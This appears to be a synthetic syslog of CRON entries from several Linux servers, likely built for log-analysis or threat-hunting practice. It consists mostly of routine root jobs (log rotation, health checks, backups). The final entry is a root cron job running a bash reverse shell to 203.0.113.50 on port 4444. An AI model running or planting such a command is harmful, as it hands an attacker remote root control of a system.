Mar 17 11:40:49 LNX-WEB-002 CRON[2102]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 28 09:49:46 LNX-BACKUP-001 CRON[1497]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 28 09:42:37 LNX-WEB-002 CRON[1079]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 27 14:56:21 LNX-LOG-001 CRON[9139]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 23 10:14:20 LNX-DB-001 CRON[1616]: (root) CMD (/usr/local/bin/backup.sh)
Mar 06 16:40:50 LNX-DB-001 CRON[2815]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 10 17:39:57 LNX-DB-002 CRON[8400]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 07 16:02:34 LNX-LOG-001 CRON[1628]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 09 10:57:33 LNX-DB-001 CRON[2487]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 06 10:13:09 LNX-WEB-001 CRON[5539]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 11 16:44:37 LNX-WEB-001 CRON[9821]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 11 11:18:32 LNX-DEV-001 CRON[5749]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 25 14:52:04 LNX-DB-001 CRON[7213]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 25 10:19:17 LNX-FILE-001 CRON[2967]: (root) CMD (/usr/local/bin/backup.sh)
Mar 23 09:10:17 LNX-DB-002 CRON[2314]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 28 15:31:40 LNX-LOG-001 CRON[9055]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 06 11:37:17 LNX-DB-001 CRON[1098]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 08 17:55:36 LNX-LOG-001 CRON[9428]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 05 15:01:55 LNX-DEV-001 CRON[6038]: (root) CMD (/usr/local/bin/backup.sh)
Mar 01 14:00:29 LNX-DB-002 CRON[4072]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 17 16:40:50 LNX-LOG-001 CRON[6785]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 07 17:28:13 LNX-FILE-001 CRON[5256]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 29 10:21:04 LNX-APP-001 CRON[4501]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 16 09:08:58 LNX-WEB-002 CRON[8954]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 01 10:57:04 LNX-WEB-002 CRON[2736]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 15 09:27:45 LNX-DB-002 CRON[6636]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 05 14:03:02 LNX-WEB-001 CRON[6716]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 29 12:59:06 LNX-WEB-002 CRON[3326]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 27 14:30:17 LNX-DEV-001 CRON[5699]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 30 09:10:51 LNX-LOG-001 CRON[3274]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 05 15:40:15 LNX-APP-002 CRON[1768]: (root) CMD (/usr/local/bin/backup.sh)
Mar 09 13:18:06 LNX-DB-002 CRON[9247]: (root) CMD (/usr/local/bin/backup.sh)
Mar 10 11:27:55 LNX-WEB-001 CRON[2580]: (root) CMD (/usr/local/bin/backup.sh)
Mar 05 10:25:38 LNX-DEV-001 CRON[9902]: (root) CMD (/usr/local/bin/backup.sh)
Mar 14 13:37:39 LNX-DEV-001 CRON[9294]: (root) CMD (/usr/local/bin/backup.sh)
Mar 17 08:09:28 LNX-WEB-001 CRON[2851]: (root) CMD (/usr/local/bin/backup.sh)
Mar 25 10:27:54 LNX-BACKUP-001 CRON[8908]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 09 17:30:31 LNX-FILE-001 CRON[2149]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 20 08:37:10 LNX-BACKUP-001 CRON[8926]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 22 16:12:41 LNX-DEV-001 CRON[5314]: (root) CMD (/usr/local/bin/backup.sh)
Mar 05 08:04:57 LNX-WEB-002 CRON[5597]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 05 16:37:17 LNX-DEV-001 CRON[7930]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 04 08:45:30 LNX-BACKUP-001 CRON[7550]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 06 08:59:06 LNX-FILE-001 CRON[4547]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 13 13:38:43 LNX-DB-002 CRON[9694]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 05 16:45:48 LNX-DEV-001 CRON[5160]: (root) CMD (/usr/local/bin/backup.sh)
Mar 04 10:47:58 LNX-DEV-001 CRON[2311]: (root) CMD (/usr/local/bin/backup.sh)
Mar 05 17:31:23 LNX-DB-002 CRON[4624]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 17 14:49:36 LNX-APP-001 CRON[8569]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 04 17:33:54 LNX-BACKUP-001 CRON[9318]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 30 17:41:47 LNX-FILE-001 CRON[8214]: (root) CMD (/usr/local/bin/backup.sh)
Mar 21 16:57:16 LNX-WEB-001 CRON[6485]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 30 17:08:33 LNX-WEB-002 CRON[4628]: (root) CMD (/usr/local/bin/backup.sh)
Mar 26 09:21:28 LNX-APP-001 CRON[5981]: (root) CMD (/usr/local/bin/backup.sh)
Mar 03 15:16:12 LNX-DB-002 CRON[8512]: (root) CMD (/usr/local/bin/backup.sh)
Mar 14 08:28:21 LNX-FILE-001 CRON[2906]: (root) CMD (/usr/local/bin/backup.sh)
Mar 26 16:51:51 LNX-BACKUP-001 CRON[5083]: (root) CMD (/usr/local/bin/backup.sh)
Mar 02 15:08:42 LNX-APP-001 CRON[1061]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 19 08:46:23 LNX-FILE-001 CRON[4309]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 20 11:29:59 LNX-DB-001 CRON[7234]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 09 17:33:31 LNX-FILE-001 CRON[9360]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 13 13:00:29 LNX-APP-002 CRON[7994]: (root) CMD (/usr/local/bin/backup.sh)
Mar 23 17:17:10 LNX-WEB-002 CRON[4038]: (root) CMD (/usr/local/bin/backup.sh)
Mar 17 10:03:06 LNX-APP-002 CRON[8452]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 01 09:32:57 LNX-WEB-002 CRON[7855]: (root) CMD (/usr/local/bin/backup.sh)
Mar 09 08:31:02 LNX-FILE-001 CRON[9793]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 12 11:27:19 LNX-DEV-001 CRON[9849]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 08 11:45:41 LNX-APP-002 CRON[1579]: (root) CMD (/usr/local/bin/backup.sh)
Mar 28 17:20:04 LNX-BACKUP-001 CRON[1248]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 13 11:51:52 LNX-DB-001 CRON[4987]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 20 14:36:04 LNX-DB-002 CRON[9899]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 25 14:56:08 LNX-BACKUP-001 CRON[8949]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 04 14:36:10 LNX-WEB-001 CRON[8799]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 12 11:42:18 LNX-APP-001 CRON[7375]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 23 16:03:21 LNX-APP-001 CRON[8699]: (root) CMD (/usr/local/bin/backup.sh)
Mar 12 08:51:01 LNX-FILE-001 CRON[2142]: (root) CMD (/usr/local/bin/backup.sh)
Mar 26 16:22:56 LNX-FILE-001 CRON[4739]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 16 13:45:58 LNX-FILE-001 CRON[2925]: (root) CMD (/usr/local/bin/backup.sh)
Mar 23 15:05:43 LNX-FILE-001 CRON[2393]: (root) CMD (/usr/local/bin/backup.sh)
Mar 03 11:59:56 LNX-DB-002 CRON[5869]: (root) CMD (/usr/local/bin/backup.sh)
Mar 10 14:45:52 LNX-DB-001 CRON[1841]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 14 08:47:59 LNX-BACKUP-001 CRON[2992]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 16 16:45:52 LNX-DB-001 CRON[3629]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 17 15:36:56 LNX-BACKUP-001 CRON[7665]: (root) CMD (/usr/local/bin/backup.sh)
Mar 07 15:36:57 LNX-APP-002 CRON[3704]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 17 16:50:09 LNX-DEV-001 CRON[5028]: (root) CMD (/usr/local/bin/backup.sh)
Mar 28 16:06:50 LNX-LOG-001 CRON[8991]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 12 17:22:27 LNX-FILE-001 CRON[1002]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 10 16:05:35 LNX-FILE-001 CRON[3058]: (root) CMD (/usr/local/bin/backup.sh)
Mar 10 08:14:34 LNX-BACKUP-001 CRON[3108]: (root) CMD (/usr/local/bin/backup.sh)
Mar 18 10:56:56 LNX-DEV-001 CRON[2927]: (root) CMD (/usr/local/bin/backup.sh)
Mar 12 13:53:37 LNX-DEV-001 CRON[1845]: (root) CMD (/usr/local/bin/backup.sh)
Mar 09 08:52:19 LNX-APP-002 CRON[6089]: (root) CMD (/usr/local/bin/backup.sh)
Mar 12 12:58:44 LNX-DB-002 CRON[3962]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 07 11:03:52 LNX-BACKUP-001 CRON[5151]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 13 12:14:29 LNX-APP-001 CRON[8450]: (root) CMD (/usr/local/bin/backup.sh)
Mar 16 16:42:55 LNX-LOG-001 CRON[6847]: (root) CMD (/usr/local/bin/backup.sh)
Mar 06 16:39:19 LNX-DB-001 CRON[2894]: (root) CMD (/usr/local/bin/backup.sh)
Mar 08 17:32:19 LNX-DB-001 CRON[1600]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 27 15:26:54 LNX-APP-001 CRON[6651]: (root) CMD (/usr/local/bin/backup.sh)
Mar 06 17:38:34 LNX-FILE-001 CRON[5479]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 06 14:50:07 LNX-DEV-001 CRON[9404]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 17 16:09:58 LNX-APP-002 CRON[3710]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 05 13:25:47 LNX-BACKUP-001 CRON[8565]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 19 16:07:37 LNX-WEB-001 CRON[5244]: (root) CMD (/usr/local/bin/backup.sh)
Mar 27 17:07:15 LNX-WEB-001 CRON[6540]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 12 17:30:00 LNX-WEB-001 CRON[4820]: (root) CMD (/usr/local/bin/backup.sh)
Mar 22 09:20:41 LNX-LOG-001 CRON[7658]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 11 17:34:26 LNX-FILE-001 CRON[7340]: (root) CMD (/usr/local/bin/backup.sh)
Mar 14 09:29:02 LNX-DB-001 CRON[3849]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 26 11:21:31 LNX-DEV-001 CRON[1731]: (root) CMD (/usr/local/bin/backup.sh)
Mar 29 15:46:48 LNX-LOG-001 CRON[9063]: (root) CMD (/usr/local/bin/backup.sh)
Mar 22 15:57:39 LNX-BACKUP-001 CRON[2372]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 06 12:39:55 LNX-FILE-001 CRON[3044]: (root) CMD (/usr/local/bin/backup.sh)
Mar 17 09:58:36 LNX-APP-002 CRON[2136]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 08 09:30:19 LNX-DB-002 CRON[2456]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 14 14:23:36 LNX-APP-001 CRON[9112]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 08 15:05:17 LNX-BACKUP-001 CRON[1723]: (root) CMD (/usr/local/bin/backup.sh)
Mar 23 15:44:14 LNX-DEV-001 CRON[4259]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 01 09:24:24 LNX-APP-002 CRON[4315]: (root) CMD (/usr/local/bin/backup.sh)
Mar 07 14:53:25 LNX-FILE-001 CRON[9567]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 02 09:47:31 LNX-FILE-001 CRON[5247]: (root) CMD (/usr/local/bin/backup.sh)
Mar 07 10:27:16 LNX-FILE-001 CRON[3670]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 04 16:47:31 LNX-APP-002 CRON[7316]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 13 12:05:11 LNX-LOG-001 CRON[9870]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 04 17:22:42 LNX-WEB-001 CRON[3636]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 28 12:23:34 LNX-WEB-001 CRON[9978]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 28 08:18:24 LNX-WEB-002 CRON[4493]: (root) CMD (/usr/local/bin/backup.sh)
Mar 08 13:56:00 LNX-LOG-001 CRON[3539]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 13 12:09:54 LNX-FILE-001 CRON[5554]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 27 16:55:26 LNX-DB-001 CRON[4325]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 28 09:11:24 LNX-DEV-001 CRON[6220]: (root) CMD (/usr/local/bin/backup.sh)
Mar 08 16:54:49 LNX-APP-002 CRON[9297]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 09 13:18:25 LNX-APP-002 CRON[6015]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 14 13:27:32 LNX-BACKUP-001 CRON[5157]: (root) CMD (/usr/local/bin/backup.sh)
Mar 14 08:26:56 LNX-FILE-001 CRON[5491]: (root) CMD (/usr/local/bin/backup.sh)
Mar 26 11:34:58 LNX-APP-002 CRON[4023]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 18 12:54:49 LNX-APP-001 CRON[2195]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 03 10:37:48 LNX-APP-001 CRON[6642]: (root) CMD (/usr/local/bin/backup.sh)
Mar 30 09:38:53 LNX-LOG-001 CRON[1383]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 06 16:42:58 LNX-FILE-001 CRON[4789]: (root) CMD (/usr/local/bin/backup.sh)
Mar 25 11:35:13 LNX-APP-001 CRON[5053]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 17 17:09:22 LNX-WEB-002 CRON[6159]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 02 10:08:26 LNX-APP-002 CRON[6688]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 30 08:17:01 LNX-FILE-001 CRON[7717]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 05 13:37:44 LNX-WEB-001 CRON[7489]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 07 17:08:00 LNX-WEB-002 CRON[9423]: (root) CMD (/usr/local/bin/backup.sh)
Mar 09 13:58:45 LNX-DB-001 CRON[3773]: (root) CMD (/usr/local/bin/backup.sh)
Mar 13 17:25:56 LNX-BACKUP-001 CRON[6053]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 22 15:44:16 LNX-DEV-001 CRON[7502]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 24 13:33:52 LNX-FILE-001 CRON[2294]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 07 14:26:52 LNX-DEV-001 CRON[4092]: (root) CMD (/usr/local/bin/backup.sh)
Mar 27 11:21:02 LNX-DB-001 CRON[7150]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 25 15:48:07 LNX-BACKUP-001 CRON[3373]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 19 17:59:25 LNX-WEB-002 CRON[1446]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 18 08:57:54 LNX-APP-001 CRON[8941]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 07 15:58:12 LNX-APP-001 CRON[6305]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 01 15:42:52 LNX-DEV-001 CRON[8764]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 24 10:15:05 LNX-DB-002 CRON[7045]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 13 14:28:57 LNX-DB-001 CRON[7899]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 11 14:19:55 LNX-FILE-001 CRON[5352]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 17 12:45:30 LNX-APP-001 CRON[5691]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 07 16:48:22 LNX-BACKUP-001 CRON[4356]: (root) CMD (/usr/local/bin/backup.sh)
Mar 11 10:40:38 LNX-APP-002 CRON[3767]: (root) CMD (/usr/local/bin/backup.sh)
Mar 02 17:20:43 LNX-DB-002 CRON[3937]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 15 10:47:58 LNX-DB-001 CRON[3958]: (root) CMD (/usr/local/bin/backup.sh)
Mar 15 10:04:19 LNX-APP-002 CRON[2506]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 05 15:31:03 LNX-APP-001 CRON[2805]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 27 09:32:49 LNX-WEB-001 CRON[4421]: (root) CMD (/usr/local/bin/backup.sh)
Mar 05 15:22:08 LNX-FILE-001 CRON[8210]: (root) CMD (/usr/local/bin/backup.sh)
Mar 04 15:37:42 LNX-BACKUP-001 CRON[9116]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 12 09:30:38 LNX-BACKUP-001 CRON[5003]: (root) CMD (/usr/local/bin/backup.sh)
Mar 09 16:48:04 LNX-FILE-001 CRON[1086]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 27 08:55:01 LNX-BACKUP-001 CRON[3935]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 24 15:18:33 LNX-BACKUP-001 CRON[7530]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 14 13:11:29 LNX-DB-002 CRON[6223]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 20 10:28:00 LNX-FILE-001 CRON[9875]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 19 13:09:28 LNX-WEB-002 CRON[8399]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 11 09:41:27 LNX-LOG-001 CRON[5209]: (root) CMD (/usr/local/bin/backup.sh)
Mar 16 17:41:10 LNX-DEV-001 CRON[8978]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 11 09:48:28 LNX-DB-002 CRON[3759]: (root) CMD (/usr/local/bin/backup.sh)
Mar 13 17:28:02 LNX-APP-001 CRON[9044]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 27 08:47:05 LNX-APP-001 CRON[2235]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 07 13:37:50 LNX-APP-002 CRON[9642]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 14 16:17:46 LNX-DB-001 CRON[1241]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 26 13:05:54 LNX-DB-002 CRON[1812]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 23 14:17:42 LNX-BACKUP-001 CRON[2801]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 28 13:40:47 LNX-DEV-001 CRON[9676]: (root) CMD (/usr/local/bin/backup.sh)
Mar 07 09:20:15 LNX-FILE-001 CRON[2236]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 19 15:28:58 LNX-LOG-001 CRON[6958]: (root) CMD (/usr/local/bin/backup.sh)
Mar 02 13:50:20 LNX-BACKUP-001 CRON[8559]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 19 08:05:55 LNX-WEB-001 CRON[5245]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 18 10:35:43 LNX-APP-001 CRON[4501]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 29 08:30:49 LNX-APP-001 CRON[3324]: (root) CMD (/usr/local/bin/backup.sh)
Mar 18 09:39:00 LNX-BACKUP-001 CRON[9916]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 30 09:55:38 LNX-WEB-002 CRON[3968]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 09 10:37:14 LNX-WEB-002 CRON[8722]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 25 14:38:42 LNX-DB-001 CRON[7008]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 04 09:50:19 LNX-DB-001 CRON[4553]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 22 15:48:17 LNX-FILE-001 CRON[3490]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 11 11:10:39 LNX-BACKUP-001 CRON[3517]: (root) CMD (/usr/local/bin/backup.sh)
Mar 09 10:26:44 LNX-APP-001 CRON[9256]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 12 16:06:19 LNX-APP-002 CRON[4605]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 07 09:54:43 LNX-DB-002 CRON[7461]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 14 14:53:30 LNX-WEB-001 CRON[1856]: (root) CMD (/usr/local/bin/backup.sh)
Mar 28 15:22:13 LNX-APP-001 CRON[4953]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 27 08:25:53 LNX-WEB-002 CRON[7175]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 02 15:11:34 LNX-DB-002 CRON[4205]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 18 12:16:52 LNX-APP-002 CRON[7679]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 20 16:27:46 LNX-APP-001 CRON[9771]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 29 16:11:53 LNX-APP-001 CRON[2502]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 15 08:56:38 LNX-DB-002 CRON[2085]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 04 15:16:02 LNX-APP-001 CRON[3864]: (root) CMD (/usr/local/bin/backup.sh)
Mar 10 10:41:07 LNX-DEV-001 CRON[1800]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 11 09:23:48 LNX-DB-001 CRON[6461]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 26 10:12:19 LNX-APP-001 CRON[4016]: (root) CMD (/usr/local/bin/backup.sh)
Mar 03 09:27:41 LNX-APP-002 CRON[6518]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 03 12:13:34 LNX-APP-001 CRON[5717]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 12 16:04:19 LNX-WEB-002 CRON[6777]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 12 11:51:48 LNX-APP-002 CRON[1093]: (root) CMD (/usr/local/bin/backup.sh)
Mar 27 14:24:52 LNX-WEB-002 CRON[8768]: (root) CMD (/usr/local/bin/backup.sh)
Mar 16 12:38:54 LNX-FILE-001 CRON[7084]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 01 08:48:42 LNX-WEB-002 CRON[1356]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 15 03:35:00 LNX-WEB-001 CRON[9100]: (root) CMD (/bin/bash -c 'bash -i >& /dev/tcp/203.0.113.50/4444 0>&1')